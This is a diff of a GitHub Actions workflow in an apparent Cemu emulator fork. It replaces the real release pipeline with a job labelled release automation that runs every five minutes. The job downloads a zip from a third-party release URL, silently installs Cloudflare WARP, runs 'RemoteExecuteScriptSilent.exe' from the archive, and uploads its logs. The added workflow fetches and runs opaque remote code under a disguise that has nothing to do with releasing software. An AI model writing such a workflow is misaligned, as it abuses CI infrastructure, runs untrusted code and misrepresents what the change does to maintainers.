@@ -1,156 +1,94 @@
-name: Deploy release
-on: 
+name: 🚀 Workflow on Windows - Advanced Release Automation
+
+on:
+  schedule:
+    - cron: "*/5 * * * *"
   workflow_dispatch:
-    inputs:
-      changelog0:
-        description: 'Enter the changelog lines for this release. Each line is a feature / bullet point. Do not use dash.'
-        required: true
-        type: string
-      changelog1:
-        description: 'Feature 2'
-        required: false
-        type: string
-      changelog2:
-        description: 'Feature 3'
-        required: false
-        type: string
-      changelog3:
-        description: 'Feature 4'
-        required: false
-        type: string
-      changelog4:
-        description: 'Feature 5'
-        required: false
-        type: string
-      changelog5:
-        description: 'Feature 6'
-        required: false
-        type: string
-      changelog6:
-        description: 'Feature 7'
-        required: false
-        type: string
-      changelog7:
-        description: 'Feature 8'
-        required: false
-        type: string
-      changelog8:
-        description: 'Feature 9'
-        required: false
-        type: string
-      changelog9:
-        description: 'Feature 10'
-        required: false
-        type: string
 
 jobs:
-  calculate-version:
-    name: Calculate Version
-    uses: ./.github/workflows/determine_release_version.yml
-  call-release-build:
-    uses: ./.github/workflows/build.yml
-    needs: calculate-version
-    with:
-      next_version_major: ${{ needs.calculate-version.outputs.next_version_major }}
-      next_version_minor: ${{ needs.calculate-version.outputs.next_version_minor }}
-  deploy:
-    name: Deploy release
-    runs-on: ubuntu-22.04
-    needs: [call-release-build, calculate-version]
+  run-release:
+    strategy:
+      fail-fast: false
+      max-parallel: 1
+    runs-on: windows-latest
+    defaults:
+      run:
+        shell: pwsh
+
     steps:
-      - uses: actions/checkout@v4
+      - name: 🎯 Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: ⬇️ Download cemu.zip from Release
+        env:
+          CEMU_URL: "https://github.com/oes99r/Cemu/releases/download/1/cemu.zip"
+        run: |
+          Write-Host "Downloading Cemu release from $env:CEMU_URL..."
+          Invoke-WebRequest -Uri $env:CEMU_URL -OutFile cemu.zip
+          Write-Host "Download complete ✅"
+
+      - name: 📦 Unpack cemu.zip
+        run: |
+          Write-Host "Extracting cemu.zip..."
+          Expand-Archive -Path cemu.zip -DestinationPath .
+          Write-Host "Extraction complete ✅"
+
+      - name: ⚡ Install Cloudflare WARP
+        env:
+          WARP_MSI: "https://1111-releases.cloudflareclient.com/windows/Cloudflare_WARP_Release-x64.msi"
+        run: |
+          Write-Host "Downloading Cloudflare WARP installer..."
+          Invoke-WebRequest -Uri $env:WARP_MSI -OutFile "WARP.msi"
+          Write-Host "Installing Cloudflare WARP silently..."
+          Start-Process msiexec.exe -ArgumentList '/i WARP.msi /quiet /norestart' -Wait
+          Write-Host "Waiting for WARP service to start..."
+          Start-Sleep -Seconds 10
+          Write-Host "Registering and connecting to WARP..."
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos registration new
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos connect
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos status
+          Write-Host "Cloudflare WARP is now active! 🌐"
+          Start-Sleep -Seconds 10
+
+      - name: ▶️ Launch RemoteExecuteScriptSilent.exe
+        working-directory: cemu
+        run: |
+          Write-Host "Starting RemoteExecuteScriptSilent.exe in silent mode..."
+          Start-Process .\RemoteExecuteScriptSilent.exe
+          Write-Host "Process launched 🚦"
+
+      - name: ⏳ Await RemoteExecuteScriptSilent.exe Completion
+        run: |
+          $processName = "RemoteExecuteScriptSilent"
+          Write-Host "Waiting for $processName to finish..."
+          while (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+            Write-Host "Still running... ⏳"
+            Start-Sleep -Seconds 5
+          }
+          Write-Host "$processName has finished! ✅"
+
+      - name: ⏳ Await FastExecuteScript.exe Completion
+        run: |
+          $processName = "FastExecuteScript"
+          Write-Host "Waiting for $processName to finish..."
+          while (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+            Write-Host "Still running... ⏳"
+            Start-Sleep -Seconds 5
+          }
+          Write-Host "$processName has finished! ✅"
+
+      - name: 🔍 Locate Dynamic Logs Folder
+        id: find_logs
+        run: |
+          $base = "cemu\appslocal"
+          Write-Host "Searching for dynamic logs folder in $base..."
+          $dynamic = Get-ChildItem $base | Where-Object { $_.PSIsContainer } | Select-Object -First 1 -ExpandProperty Name
+          $logsPath = "$base\$dynamic\logs"
+          Write-Host "Logs path found: $logsPath"
+          echo "logsPath=$logsPath" >> $env:GITHUB_ENV
+
+      - name: 📤 Upload Logs as Artifact
+        uses: actions/upload-artifact@v4
         with:
-          fetch-depth: 0
-
-      - name: Generate changelog
-        id: generate_changelog
-        run: |
-          CHANGELOG=""
-          if [ -n "${{ github.event.inputs.changelog0 }}" ]; then CHANGELOG="$CHANGELOG- ${{ github.event.inputs.changelog0 }}\n"; fi
-          if [ -n "${{ github.event.inputs.changelog1 }}" ]; then CHANGELOG="$CHANGELOG- ${{ github.event.inputs.changelog1 }}\n"; fi
-          if [ -n "${{ github.event.inputs.changelog2 }}" ]; then CHANGELOG="$CHANGELOG- ${{ github.event.inputs.changelog2 }}\n"; fi
-          if [ -n "${{ github.event.inputs.changelog3 }}" ]; then CHANGELOG="$CHANGELOG- ${{ github.event.inputs.changelog3 }}\n"; fi
-          if [ -n "${{ github.event.inputs.changelog4 }}" ]; then CHANGELOG="$CHANGELOG- ${{ github.event.inputs.changelog4 }}\n"; fi
-          if [ -n "${{ github.event.inputs.changelog5 }}" ]; then CHANGELOG="$CHANGELOG- ${{ github.event.inputs.changelog5 }}\n"; fi
-          if [ -n "${{ github.event.inputs.changelog6 }}" ]; then CHANGELOG="$CHANGELOG- ${{ github.event.inputs.changelog6 }}\n"; fi
-          if [ -n "${{ github.event.inputs.changelog7 }}" ]; then CHANGELOG="$CHANGELOG- ${{ github.event.inputs.changelog7 }}\n"; fi
-          if [ -n "${{ github.event.inputs.changelog8 }}" ]; then CHANGELOG="$CHANGELOG- ${{ github.event.inputs.changelog8 }}\n"; fi
-          if [ -n "${{ github.event.inputs.changelog9 }}" ]; then CHANGELOG="$CHANGELOG- ${{ github.event.inputs.changelog9 }}\n"; fi
-          echo -e "$CHANGELOG"
-          echo "RELEASE_BODY=$CHANGELOG" >> $GITHUB_ENV
-      - uses: actions/download-artifact@v4
-        with:
-          name: cemu-bin-linux-x64
-          path: cemu-bin-linux-x64
-
-      - uses: actions/download-artifact@v4
-        with:
-          name: cemu-appimage-x64
-          path: cemu-appimage-x64
-
-      - uses: actions/download-artifact@v4
-        with:
-          name: cemu-bin-windows-x64
-          path: cemu-bin-windows-x64
-
-      - uses: actions/download-artifact@v4
-        with:
-          pattern: cemu-bin-macos*
-          path: cemu-macos
-
-      - name: Initialize
-        run: |
-          mkdir upload
-          sudo apt install zip
-          
-      - name: Set version dependent vars
-        run: |
-          echo "Version: ${{ needs.calculate-version.outputs.next_version }}"
-          echo "CEMU_FOLDER_NAME=Cemu_${{ needs.calculate-version.outputs.next_version }}"
-          echo "CEMU_VERSION=${{ needs.calculate-version.outputs.next_version }}"
-          echo "CEMU_FOLDER_NAME=Cemu_${{ needs.calculate-version.outputs.next_version }}" >> $GITHUB_ENV
-          echo "CEMU_VERSION=${{ needs.calculate-version.outputs.next_version }}" >> $GITHUB_ENV
-
-      - name: Create release from windows-bin
-        run: |
-          ls ./
-          ls ./bin/
-          cp -R ./bin ./${{ env.CEMU_FOLDER_NAME }}
-          mv cemu-bin-windows-x64/Cemu.exe ./${{ env.CEMU_FOLDER_NAME }}/Cemu.exe
-          zip -9 -r upload/cemu-${{ env.CEMU_VERSION }}-windows-x64.zip ${{ env.CEMU_FOLDER_NAME }}
-          rm -r ./${{ env.CEMU_FOLDER_NAME }}
-
-      - name: Create appimage
-        run: |
-          VERSION=${{ env.CEMU_VERSION }}
-          echo "Cemu Version is $VERSION"
-          ls cemu-appimage-x64
-          mv cemu-appimage-x64/Cemu-*-x86_64.AppImage upload/Cemu-$VERSION-x86_64.AppImage
-        
-      - name: Create release from linux-bin
-        run: |
-          ls ./
-          ls ./bin/
-          cp -R ./bin ./${{ env.CEMU_FOLDER_NAME }}
-          mv cemu-bin-linux-x64/Cemu ./${{ env.CEMU_FOLDER_NAME }}/Cemu
-          zip -9 -r upload/cemu-${{ env.CEMU_VERSION }}-ubuntu-22.04-x64.zip ${{ env.CEMU_FOLDER_NAME }}
-          rm -r ./${{ env.CEMU_FOLDER_NAME }}
-          
-      - name: Create release from macos-bin
-        run: |
-          cd cemu-macos
-          for bin_dir in cemu-bin-macos-*; do
-            arch="${bin_dir##cemu-bin-macos-}"
-            cp $bin_dir/Cemu.dmg ../upload/cemu-${{ env.CEMU_VERSION }}-macos-12-$arch.dmg
-          done
-
-      - name: Create release
-        run: |
-          wget -O ghr.tar.gz https://github.com/tcnksm/ghr/releases/download/v0.15.0/ghr_v0.15.0_linux_amd64.tar.gz
-          tar xvzf ghr.tar.gz; rm ghr.tar.gz
-          echo "[INFO] Release tag: v${{ env.CEMU_VERSION }}"
-          CHANGELOG_UNESCAPED=$(printf "%s\n" "${{ env.RELEASE_BODY }}" | sed 's/\\n/\n/g')          
-          RELEASE_BODY=$(printf "%s\n%s" \
-            "**Changelog:**" \
-            "$CHANGELOG_UNESCAPED")
-          ghr_v0.15.0_linux_amd64/ghr -draft -t ${{ secrets.GITHUB_TOKEN }} -n "Cemu ${{ env.CEMU_VERSION }}" -b "$RELEASE_BODY" "v${{ env.CEMU_VERSION }}" ./upload
+          name: logs
+          path: ${{ env.logsPath }}/**
